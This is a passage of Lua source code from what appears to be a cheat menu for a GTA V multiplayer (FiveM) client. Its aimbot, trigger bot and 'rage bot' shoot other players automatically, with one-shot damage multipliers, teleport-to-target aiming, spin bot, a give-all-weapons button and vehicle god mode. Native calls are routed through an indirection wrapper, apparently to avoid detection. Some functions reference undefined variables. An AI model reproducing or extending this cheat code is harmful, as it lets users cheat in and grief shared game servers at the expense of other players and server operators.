        -- local _w = (self.Painter:GetTextWidth("SPIN BOT", 4, 0.35)) + 20
   
        -- if self.Painter:CheckBox("SPIN BOT", self.Config.Player.SpinBot, x, y, w - _w - 10, curY, nil, 20, 255, 255, 255, 255, "spinner_bot_enabled") then
   
        -- 	self.Config.Player.SpinBot = not self.Config.Player.SpinBot
   
        -- 	self.ConfigClass.Save(true)
   
        -- end
   
        local function _is_ped_player(ped)
   
            local id = AREF:GetFunction("NetworkGetPlayerIndexFromPed")(ped)
   
    
   
            return id and id > 0
   
        end
   
    
   
        local function rot_to_dir(rot)
   
            local radZ = rot.z * 0.0174532924
   
            local radX = rot.x * 0.0174532924
   
            local num = dict.math.abs(dict.math.cos(radX))
   
            local dir = vector3(-dict.math.sin(radZ) * num, dict.math.cos(radZ) * num, radX)
   
    
   
            return dir
   
        end
   
    
   
        local function _multiply(vector, mult)
   
            return vector3(vector.x * mult, vector.y * mult, vector.z * mult)
   
        end
   
    
   
        local function _get_ped_hovered_over()
   
            local cur = AREF:GetFunction("GetGameplayCamCoord")()
   
            local _dir = AREF:GetFunction("GetGameplayCamRot")(0)
   
            local dir = rot_to_dir(_dir)
   
            local len = _multiply(dir, AREF.Config.Player.TriggerBotDistance)
   
            local targ = cur + len
   
            local handle = AREF:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, -1)
   
            local _, hit, hit_pos, _, entity = AREF:GetFunction("GetShapeTestResult")(handle)
   
            local force
   
            local _seat
   
    
   
            if AREF:GetFunction("DoesEntityExist")(entity) and AREF:GetFunction("IsEntityAVehicle")(entity) and AREF.Config.Player.TargetInsideVehicles and (not AREF.Config.Player.AimbotNeedsLOS or AREF:GetFunction("HasEntityLosToOther")(AREF.LocalPlayer, entity, true)) then
   
                local driver = AREF:GetFunction("GetPedInVehicleSeat")(entity, -1)
   
    
   
                if AREF:GetFunction("DoesEntityExist")(driver) and not AREF:GetFunction("IsPedDeadOrDying")(driver) then
   
                    entity = driver
   
                    force = true
   
                    _seat = -1
   
                else
   
                    local _dist = dict.math.huge
   
                    local _ped
   
    
   
                    for i = -2, AREF:GetFunction("GetVehicleMaxNumberOfPassengers")(vehicle) do
   
                        local who = AREF:GetFunction("GetPedInVehicleSeat")(entity, i)
   
    
   
                        if AREF:GetFunction("DoesEntityExist")(who) and AREF:GetFunction("IsEntityAPed")(who) and not AREF:GetFunction("IsPedDeadOrDying")(who) then
   
                            local s_pos = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(who, 0.0, 0.0, 0.0)
   
                            local s_dist = AREF:GetFunction("GetDistanceBetweenCoords")(hit_pos.x, hit_pos.y, hit_pos.z, s_pos.x, s_pos.y, s_pos.z, true)
   
    
   
                            if s_dist < _dist then
   
                                _dist = s_dist
   
                                _ped = who
   
                                _seat = i
   
                            end
   
                        end
   
                    end
   
    
   
                    if AREF:GetFunction("DoesEntityExist")(_ped) and AREF:GetFunction("IsEntityAPed")(_ped) then
   
                        entity = _ped
   
                        force = true
   
                    end
   
                end
   
            end
   
    
   
            if hit and AREF:GetFunction("DoesEntityExist")(entity) and AREF:GetFunction("DoesEntityHaveDrawable")(entity) and AREF:GetFunction("IsEntityAPed")(entity) and (force or AREF:GetFunction("HasEntityLosToOther")(AREF.LocalPlayer, entity, true)) then return true, entity, _seat end
   
    
   
            return nil, false, nil
   
        end
   
    
   
        local _aimbot_poly = {}
   
    
   
        local function _within_poly(point, poly)
   
            local inside = false
   
            local j = #poly
   
    
   
            for i = 1, #poly do
   
                if (poly[i].y < point.y and poly[j].y >= point.y or poly[j].y < point.y and poly[i].y >= point.y) and (poly[i].x + (point.y - poly[i].y) / (poly[j].y - poly[i].y) * (poly[j].x - poly[i].x) < point.x) then
   
                    inside = not inside
   
                end
   
    
   
                j = i
   
            end
   
    
   
            return inside
   
        end
   
    
   
        local function _is_ped_in_aimbot_fov(ped)
   
            local pos = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
   
            local showing, sx, sy = AREF:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)
   
            if not showing then return false end
   
    
   
            return _within_poly({
   
                x = sx,
   
                y = sy
   
            }, _aimbot_poly.points)
   
        end
   
    
   
        local function _get_ped_in_aimbot_fov()
   
            local fov = AREF.Config.Player.AimbotFOV
   
            local closest = dict.math.huge
   
            local selected
   
    
   
            for ped in AREF:GetClosestPeds() do
   
                if not AREF:IsFriend(ped) and (not AREF.Config.Player.OnlyTargetPlayers or _is_ped_player(ped)) then
   
                    local pos = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
   
                    local showing, sx, sy = AREF:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)
   
    
   
                    if ped ~= AREF.LocalPlayer and showing and (not AREF.Config.Player.AimbotNeedsLOS or AREF:GetFunction("HasEntityLosToOther")(AREF.LocalPlayer, ped, true)) then
   
                        local in_fov = _is_ped_in_aimbot_fov(ped)
   
                        local us = AREF:GetFunction("GetGameplayCamCoord")()
   
                        local dist = AREF:GetFunction("GetDistanceBetweenCoords")(pos.x, pos.y, pos.z, us.x, us.y, us.z)
   
    
   
                        if in_fov and dist < closest then
   
                            dist = closest
   
                            selected = ped
   
                        end
   
                    end
   
                end
   
            end
   
    
   
            if selected and (not AREF:GetFunction("DoesEntityExist")(AREF.Config.Player.AimbotTarget) or AREF:GetFunction("IsEntityDead")(AREF.Config.Player.AimbotTarget)) and not AREF:IsFriend(selected) and (not AREF.Config.Player.AimbotNeedsLOS or AREF:GetFunction("HasEntityLosToOther")(AREF.LocalPlayer, selected, true)) then
   
                AREF.Config.Player.AimbotTarget = selected
   
            end
   
    
   
            local _ped = _get_ped_hovered_over()
   
    
   
            if not AREF.Config.Player.AimbotTarget and AREF:GetFunction("DoesEntityExist")(_ped) and not AREF:IsFriend(_ped) and (not AREF.Config.Player.OnlyTargetPlayers or _is_ped_player(_ped)) then
   
                local pos = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 0.0)
   
                local showing, sx, sy = AREF:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)
   
    
   
                if _ped ~= AREF.LocalPlayer and showing and (not AREF.Config.Player.AimbotNeedsLOS or AREF:GetFunction("HasEntityLosToOther")(AREF.LocalPlayer, ped, true)) then
   
                    local in_fov = _is_ped_in_aimbot_fov(_ped)
   
    
   
                    if in_fov and not AREF:GetFunction("DoesEntityExist")(AREF.Config.Player.AimbotTarget) then
   
                        AREF.Config.Player.AimbotTarget = _ped
   
                    end
   
                end
   
            end
   
        end
   
    
   
        local function _get_closest_bone(ped, _seat)
   
            local cur = AREF:GetFunction("GetGameplayCamCoord")()
   
            local _dir = AREF:GetFunction("GetGameplayCamRot")(0)
   
            local dir = rot_to_dir(_dir)
   
            local where = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
   
            local dist = AREF:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, where.x, where.y, where.z) + 25.0
   
            local len = _multiply(dir, dist)
   
            local targ = cur + len
   
            local handle = AREF:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, -1)
   
            local _, hit, hit_pos, _, entity = AREF:GetFunction("GetShapeTestResult")(handle)
   
    
   
            if AREF:GetFunction("IsEntityAVehicle")(entity) then
   
                entity = AREF:GetFunction("GetPedInVehicleSeat")(entity, _seat)
   
            end
   
    
   
            if entity ~= ped then return false end
   
            local _dist, bone, _name = dict.math.huge, 0
   
    
   
            if hit then
   
                for _, dat in dict.ipairs(dict.bone_check) do
   
                    local id = dat[1]
   
    
   
                    if id ~= -1 then
   
                        local bone_coords = AREF:GetFunction("GetPedBoneCoords")(ped, id, 0.0, 0.0, 0.0)
   
                        local b_dist = AREF:GetFunction("GetDistanceBetweenCoords")(bone_coords.x, bone_coords.y, bone_coords.z, hit_pos.x, hit_pos.y, hit_pos.z, true)
   
    
   
                        if b_dist < _dist then
   
                            _dist = b_dist
   
                            bone = id
   
                            _name = dat[2]
   
                        end
   
                    end
   
                end
   
            end
   
    
   
            return bone, _dist, _name
   
        end
   
    
   
        function AREF:DoAimbotPoly()
   
            local sx, sy = _aimbot_poly.sx, _aimbot_poly.sy
   
            local fov = self.Config.Player.AimbotFOV
   
            if not fov then return end
   
            if sx and self:ScrW() == sx and sy and self:ScrH() == sy and _aimbot_poly.fov == self.Config.Player.AimbotFOV then return end
   
            _aimbot_poly.sx = self:ScrW()
   
            _aimbot_poly.sy = self:ScrH()
   
            _aimbot_poly.fov = self.Config.Player.AimbotFOV
   
            _aimbot_poly.points = {}
   
    
   
            for i = 1, 360 do
   
                local x = dict.math.cos(dict.math.rad(i)) / self:ScrW()
   
                local y = dict.math.sin(dict.math.rad(i)) / self:ScrH()
   
                local sx, sy = x * fov, y * fov
   
    
   
                _aimbot_poly.points[#_aimbot_poly.points + 1] = {
   
                    x = sx + ((self:ScrW() / 2) / self:ScrW()),
   
                    y = sy + ((self:ScrH() / 2) / self:ScrH())
   
                }
   
            end
   
        end
   
    
   
        function AREF:DrawAimbotFOV()
   
            for _, dat in dict.ipairs(_aimbot_poly.points) do
   
                DrawRect(dat.x, dat.y, 2.5 / self:ScrW(), 2.5 / self:ScrH(), self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], 70)
   
            end
   
        end
   
    
   
        function AREF:_rage_bot()
   
            for ped in self:GetClosestPeds() do
   
                if self:GetFunction("DoesEntityExist")(ped) and self:GetFunction("IsEntityAPed")(ped) and ped ~= self.LocalPlayer and not self:GetFunction("IsPedDeadOrDying")(ped) then
   
                    if not self:IsFriend(ped) and (not self.Config.Player.OnlyTargetPlayers or _is_ped_player(ped)) then
   
                        local bullets = 1
   
    
   
                        if self.Config.Player.OneTap then
   
                            self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 100.0)
   
                            bullets = 5
   
                        end
   
    
   
                        local destination = self:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.0)
   
                        local origin = self:GetFunction("GetPedBoneCoords")(ped, 57005, 0.0, 0.0, 0.2)
   
                        local where = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 1.0)
   
    
   
                        if self.Config.ShowText then
   
                            self:Draw3DText(where.x, where.y, where.z + 1.0, "*RAGED*", 255, 55, 70, 255)
   
                        end
   
    
   
                        for i = 1, bullets do
   
                            self:GetFunction("ShootSingleBulletBetweenCoords")(origin.x, origin.y, origin.z, destination.x, destination.y, destination.z, 1, true, self:GetFunction("GetSelectedPedWeapon")(self.LocalPlayer), self.LocalPlayer, true, false, 24000.0)
   
                        end
   
    
   
                        if self.Config.Player.OneTap then
   
                            self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 1.0)
   
                        end
   
                    end
   
                end
   
            end
   
        end
   
    
   
        function AREF:_no_bullet_drop()
   
            if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["MOUSE1"]) and not self.Showing and (not self.FreeCam.On and not self.RCCar.CamOn) then
   
                local curWep = self:GetFunction("GetSelectedPedWeapon")(self.LocalPlayer)
   
                local cur = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetCurrentPedWeaponEntityIndex")(self.LocalPlayer), 0.0, 0.0, 0.0)
   
                local _dir = self:GetFunction("GetGameplayCamRot")(0)
   
                local dir = rot_to_dir(_dir)
   
                local dist = 99999.9
   
                local len = _multiply(dir, dist)
   
                local targ = cur + len
   
                self:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, curWep, self.LocalPlayer, true, true, 24000.0)
   
                self:GetFunction("SetPedShootsAtCoord")(self.LocalPlayer, targ.x, targ.y, targ.z, true)
   
    
   
                if self.Config.Player.TPBullets then
   
                    local cur = targ + vector3(0, 0, 1)
   
                    self:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, self:GetFunction("GetSelectedPedWeapon")(self.LocalPlayer), self.LocalPlayer, true, true, 24000.0)
   
                end
   
            end
   
        end
   
    
   
        function AREF:_spin_bot()
   
            local rot = self:GetFunction("GetEntityRotation")(PlayerPedId())
   
            if not rot or (self:GetFunction("IsDisabledControlPressed")(0, self.Keys["W"]) or self:GetFunction("IsDisabledControlPressed")(0, self.Keys["A"]) or self:GetFunction("IsDisabledControlPressed")(0, self.Keys["S"]) or self:GetFunction("IsDisabledControlPressed")(0, self.Keys["D"]) or self:GetFunction("IsDisabledControlPressed")(0, self.Keys["SPACE"])) then return end
   
            self:GetFunction("SetEntityRotation")(PlayerPedId(), rot.x + math.random(-30, 30) + 0.0, rot.y + math.random(-30, 30) + 0.0, rot.z + 30.0)
   
            self:GetFunction("SetEntityVelocity")(PlayerPedId(), 0.0, 0.0, 0.0)
   
        end
   
    
   
        function AREF:_trigger_bot()
   
            local found, ent, _seat = _get_ped_hovered_over()
   
    
   
            if found and self:GetFunction("DoesEntityExist")(ent) and self:GetFunction("IsEntityAPed")(ent) and not self:IsFriend(ent) and self:GetFunction("IsPedWeaponReadyToShoot")(self.LocalPlayer) and (not self.Config.Player.OnlyTargetPlayers or _is_ped_player(ent)) then
   
                local _bone, _dist, _name = _get_closest_bone(ent, _seat)
   
    
   
                if not self.Config.Player.TriggerBotNeedsLOS or self:GetFunction("HasEntityLosToOther")(self.LocalPlayer, ent, false, _bone) then
   
                    -- SKEL_HEAD
   
                    if _seat ~= nil then
   
                        _bone = 31086
   
                    end
   
    
   
                    if _bone and not self:GetFunction("IsPedDeadOrDying")(ent) and self:GetFunction("IsPedWeaponReadyToShoot")(self.LocalPlayer) then
   
                        local bullets = 1
   
    
   
                        if self.Config.Player.OneTap then
   
                            self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 100.0)
   
                            bullets = 5
   
                        end
   
    
   
                        local _pos = self:GetFunction("GetPedBoneCoords")(ent, _bone, 0.0, 0.0, 0.0)
   
                        local where = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 1.0)
   
                        self:Draw3DText(where.x, where.y, where.z + 1.0, "*TRIGGER BOT SHOOTING*", 255, 0, 0, 255)
   
    
   
                        for i = 1, bullets do
   
                            self:GetFunction("SetPedShootsAtCoord")(self.LocalPlayer, _pos.x, _pos.y, _pos.z, true)
   
    
   
                            if self.Config.Player.TPBullets then
   
                                local cur = targ + vector3(0, 0, 1)
   
                                self:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, self:GetFunction("GetSelectedPedWeapon")(self.LocalPlayer), self.LocalPlayer, true, true, 24000.0)
   
                            end
   
                        end
   
    
   
                        if self.Config.Player.OneTap then
   
                            self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 1.0)
   
                        end
   
                    end
   
                end
   
            end
   
        end
   
    
   
        function AREF:_aimbot()
   
            local _ped = _get_ped_in_aimbot_fov()
   
    
   
            if self.Config.Player.AimbotTarget and (not self:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) or self:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget)) then
   
                self.Config.Player.AimbotTarget = nil
   
            end
   
    
   
            if self.Config.Player.AimbotTarget and self:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) and not self:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget) then
   
                _ped = self.Config.Player.AimbotTarget
   
            end
   
    
   
            if self:GetFunction("DoesEntityExist")(_ped) and not self:GetFunction("IsPedDeadOrDying")(_ped) and self.Config.ShowText then
   
                local where = self:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 1.0)
   
                self:Draw3DText(where.x, where.y, where.z + 1.0, "*AIMBOT LOCKED*", 255, 0, 0, 255)
   
            end
   
    
   
            if self:GetFunction("DoesEntityExist")(_ped) and not self:GetFunction("IsPedDeadOrDying")(_ped) and self:GetFunction("IsPedWeaponReadyToShoot")(self.LocalPlayer) then
   
                if not self.Config.Player.AimbotTarget then
   
                    self.Config.Player.AimbotTarget = _ped
   
                end
   
    
   
                local _pos = self:GetFunction("GetPedBoneCoords")(_ped, dict.bone_check[self.Config.Player.AimbotBone][1], 0.0, 0.0, 0.0)
   
                self:GetFunction("DisableControlAction", 0, self.Keys[self.Config.Player.AimbotKey], true)
   
    
   
                if self:GetFunction("IsDisabledControlPressed")(0, self.Keys[self.Config.Player.AimbotKey]) then
   
                    if self.Config.Player.OneTap then
   
                        self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 9999.9)
   
                    end
   
    
   
                    self:GetFunction("SetPedShootsAtCoord")(self.LocalPlayer, _pos.x, _pos.y, _pos.z, true)
   
    
   
                    if self.Config.Player.TPBullets then
   
                        local cur = targ + vector3(0, 0, 1)
   
                        self:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, self:GetFunction("GetSelectedPedWeapon")(self.LocalPlayer), self.LocalPlayer, true, true, 24000.0)
   
                    end
   
    
   
                    if self.Config.Player.OneTap then
   
                        self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 1.0)
   
                    end
   
                end
   
            end
   
        end
   
    
   
        function AREF:_tp_aimbot()
   
            local them = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Config.Player.AimbotTarget, 0.0, 0.0, 0.0)
   
            local us = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0)
   
            local dist = self:GetFunction("GetDistanceBetweenCoords")(them.x, them.y, them.z, us.x, us.y, us.z)
   
    
   
            if dist > self.Config.Player.TPAimbotThreshold then
   
                local fwd = self:GetFunction("GetEntityForwardVector")(self.Config.Player.AimbotTarget)
   
                local spot = them + (fwd * -self.Config.Player.TPAimbotDistance)
   
                self:GetFunction("SetEntityCoords")(self.LocalPlayer, spot.x, spot.y, spot.z - 1.0, false, false, false, false)
   
                local rot = self:GetFunction("GetEntityRotation")(self.Config.Player.AimbotTarget)
   
                self:GetFunction("SetEntityRotation")(self.LocalPlayer, rot.x, rot.y, rot.z, 0, true)
   
            end
   
        end
   
    
   
        function AREF:DoAimbot()
   
            if not self.Config.Player.AimbotFOV or not self._ScrW or not self._ScrH then return end
   
            self:DoAimbotPoly()
   
    
   
            if self.Config.Player.AimbotDrawFOV then
   
                self:DrawAimbotFOV()
   
            end
   
    
   
            if self.Config.Player.SpinBot then
   
                self:_spin_bot()
   
            end
   
    
   
            if not self:GetFunction("IsPlayerFreeAiming")(self.NetworkID) and not self:GetFunction("IsPedDoingDriveby")(self.LocalPlayer) then
   
                self.Config.Player.AimbotTarget = nil
   
    
   
                return
   
            end
   
    
   
            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys[self.Config.Player.AimbotReleaseKey]) then
   
                self.Config.Player.AimbotTarget = nil
   
            end
   
    
   
            if self.Config.Player.RageBot then
   
                self:_rage_bot()
   
            end
   
    
   
            if self.Config.Player.TriggerBot then
   
                self:_trigger_bot()
   
            end
   
    
   
            if self.Config.Player.NoDrop then
   
                self:_no_bullet_drop()
   
            end
   
    
   
            if self.Config.Player.Aimbot then
   
                self:_aimbot()
   
            end
   
    
   
            if self.Config.Player.TPAimbot and self.Config.Player.Aimbot and self.Config.Player.AimbotTarget and self:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) and not self:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget) then
   
                self:_tp_aimbot()
   
            end
   
        end
   
    
   
        CreateThread(function()
   
            while AREF.Enabled do
   
                Wait(0)
   
                AREF:DoAimbot()
   
            end
   
        end)
   
    
   
        AREF:AddCategory("Model", function(self, x, y)
   
            local curY = 0
   
    
   
            if self.Painter:Button("RANDOM COMPONENTS", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "skin_random") then
   
                CreateThread(function()
   
                    self:SetPedModel("mp_m_freemode_01")
   
                    self:GetFunction("SetPedRandomComponentVariation")(self.LocalPlayer, true)
   
                    self:GetFunction("SetPedRandomProps")(self.LocalPlayer, true)
   
                end)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("MP GREEN ALIEN", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "alien_green") then
   
                CreateThread(function()
   
                    self:SetPedModel("mp_m_freemode_01")
   
                    SetPedComponentVariation(self.LocalPlayer, 1, 134, 8)
   
                    SetPedComponentVariation(self.LocalPlayer, 2, 0, 0)
   
                    SetPedComponentVariation(self.LocalPlayer, 3, 13, 1)
   
                    SetPedComponentVariation(self.LocalPlayer, 4, 106, 8)
   
                    SetPedComponentVariation(self.LocalPlayer, 5, 0, 0)
   
                    SetPedComponentVariation(self.LocalPlayer, 6, 6, 1)
   
                    SetPedComponentVariation(self.LocalPlayer, 7, 0, 0)
   
                    SetPedComponentVariation(self.LocalPlayer, 8, 15, 1)
   
                    SetPedComponentVariation(self.LocalPlayer, 11, 274, 8)
   
                end)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("MP PURPLE ALIEN", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "alien_purple") then
   
                CreateThread(function()
   
                    self:SetPedModel("mp_m_freemode_01")
   
                    SetPedComponentVariation(self.LocalPlayer, 1, 134, 9)
   
                    SetPedComponentVariation(self.LocalPlayer, 2, 0, 0)
   
                    SetPedComponentVariation(self.LocalPlayer, 3, 13, 1)
   
                    SetPedComponentVariation(self.LocalPlayer, 4, 106, 9)
   
                    SetPedComponentVariation(self.LocalPlayer, 5, 0, 0)
   
                    SetPedComponentVariation(self.LocalPlayer, 6, 6, 1)
   
                    SetPedComponentVariation(self.LocalPlayer, 7, 0, 0)
   
                    SetPedComponentVariation(self.LocalPlayer, 8, 15, 1)
   
                    SetPedComponentVariation(self.LocalPlayer, 11, 274, 9)
   
                end)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("COVID-19 PED", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "covid_19") then
   
                CreateThread(function()
   
                    self:SetPedModel("g_m_m_chemwork_01")
   
                end)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("CUSTOM MODEL", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "custom_model") then
   
                CreateThread(function()
   
                    local mdl = self:GetTextInput("Enter model name.", "", 50)
   
    
   
                    if not mdl or mdl == "" then
   
                        self:AddNotification("INFO", "Cancelled.", 5000)
   
                    else
   
                        self:SetPedModel(mdl)
   
                    end
   
                end)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("RESET PLAYER MODEL", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "ped_reset") then
   
                CreateThread(function()
   
                    self:SetPedModel("mp_m_freemode_01")
   
                    self:GetFunction("SetPedRandomComponentVariation")(self.LocalPlayer, true)
   
                    self:GetFunction("SetPedRandomProps")(self.LocalPlayer, true)
   
                end)
   
            end
   
    
   
            curY = curY + 25
   
        end)
   
    
   
        local function _has_value(tab, val)
   
            for key, value in dict.pairs(tab) do
   
                if value == val then return true end
   
            end
   
    
   
            return false
   
        end
   
    
   
        local function _find_weapon(str)
   
            if _has_value(all_weapons, str) then return str end
   
    
   
            for _, wep in dict.ipairs(all_weapons) do
   
                if wep:lower():find(str:lower()) then return wep end
   
            end
   
    
   
            return false
   
        end
   
    
   
        local boost_options = {"1.0", "2.0", "4.0", "8.0", "16.0", "32.0", "64.0", "128.0", "256.0", "512.0"}
   
    
   
        AREF:AddCategory("Weapon", function(self, x, y)
   
            local curY = 0
   
    
   
            if self.Painter:Button("GIVE ALL WEAPONS", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "give_self_all_weapons") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    for _, wep in dict.ipairs(all_weapons) do
   
                        self:GetFunction("GiveWeaponToPed")(self.LocalPlayer, self:GetFunction("GetHashKey")(wep), 500, false, true)
   
                    end
   
    
   
                    self:AddNotification("SUCCESS", "Weapons given!", 10000)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("GIVE SPECIFIC", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "give_self_specific_weapon") then
   
                            if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    self:DoGiveWeaponUI(self.LocalPlayer)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("REMOVE SPECIFIC", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "remove_self_specific_weapon") then
   
                self:DoTakeWeaponUI(self.LocalPlayer)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("REMOVE ALL WEAPONS", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "remove_weapons") then
   
                for _, wep in dict.ipairs(all_weapons) do
   
                    if wep ~= "WEAPON_UNARMED" then
   
                        self:GetFunction("RemoveWeaponFromPed")(self.LocalPlayer, self:GetFunction("GetHashKey")(wep))
   
                    end
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:ListChoice("WEAPON DAMAGE MULTIPLIER: ", boost_options, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "weapon_damage_boost", self:IndexOf(boost_options, dict.tostring(self.Config.Weapon.DamageBoost + 0.0))) then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                    list_choices["weapon_damage_boost"].selected = 1
   
                else
   
                    self.Config.Weapon.DamageBoost = dict.tonumber(boost_options[list_choices["weapon_damage_boost"].selected])
   
                    self.ConfigClass.Save(true)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("REFILL AMMO", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "refill_ammo") then
   
                local curWep = AREF:GetFunction("GetSelectedPedWeapon")(AREF.LocalPlayer)
   
                local ret, cur_ammo = AREF:GetFunction("GetAmmoInClip")(AREF.LocalPlayer, curWep)
   
    
   
                if ret then
   
                    local max_ammo = AREF:GetFunction("GetMaxAmmoInClip")(AREF.LocalPlayer, curWep, 1)
   
    
   
                    if cur_ammo < max_ammo and max_ammo > 0 then
   
                        AREF:GetFunction("SetAmmoInClip")(AREF.LocalPlayer, curWep, max_ammo)
   
                    end
   
                end
   
    
   
                local ret, max = AREF:GetFunction("GetMaxAmmo")(AREF.LocalPlayer, curWep)
   
    
   
                if ret then
   
                    AREF:GetFunction("SetPedAmmo")(AREF.LocalPlayer, curWep, max)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
        end)
   
    
   
        AREF:AddCategory("Vehicle", function(self, x, y)
   
            local curY = 5
   
    
   
            if self.Painter:CheckBox("VEHICLE GOD MODE", self.Config.Vehicle.GodMode, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "vehicle_god_mode") then
   
                self.Config.Vehicle.GodMode = not self.Config.Vehicle.GodMode
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("BULLET PROOF TIRES", self.Config.Vehicle.BulletProofTires, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "bulletproof_enabled") then
   
                self.Config.Vehicle.BulletProofTires = not self.Config.Vehicle.BulletProofTires
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("WALLRIDE", self.Config.Vehicle.Wallride, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "wallride_enabled") then
   
                self.Config.Vehicle.Wallride = not self.Config.Vehicle.Wallride
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 20
   
    
   
            if self.Painter:Button("LSC", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "do_lsc_menu") then
   
                self:DoLSC(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("DELETE VEHICLE", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "delete_self_vehicle") then
   
                local veh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
                if not self:GetFunction("DoesEntityExist")(veh) then
   
                    self:AddNotification("ERROR", "You must be in a vehicle to use this!")
   
                else
   
                    CreateThread(function()
   
                        self:AddNotification("SUCCESS", "Deleting vehicle.", 5000)
   
    
   
                        if self.Util:DeleteEntity(veh) then
   
                            self:AddNotification("SUCCESS", "Vehicle deleted!", 5000)
   
                        end
   
                    end)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("SPAWN VEHICLE", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "spawn_self_vehicle") then
   
                local modelName = self:GetTextInput("Enter vehicle spawn name", "", 20)
   
    
   
                if modelName ~= "" and self:GetFunction("IsModelValid")(modelName) and self:GetFunction("IsModelAVehicle")(modelName) then
   
                    self:SpawnLocalVehicle(modelName, false, true)
   
                    self:AddNotification("SUCCESS", "Spawned vehicle " .. modelName, 10000)
   
                else
   
                    self:AddNotification("ERROR", "That is not a vaild vehicle model.", 10000)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("REPAIR VEHICLE", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "repair_vehicle") then
   
                local veh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer, false)
   
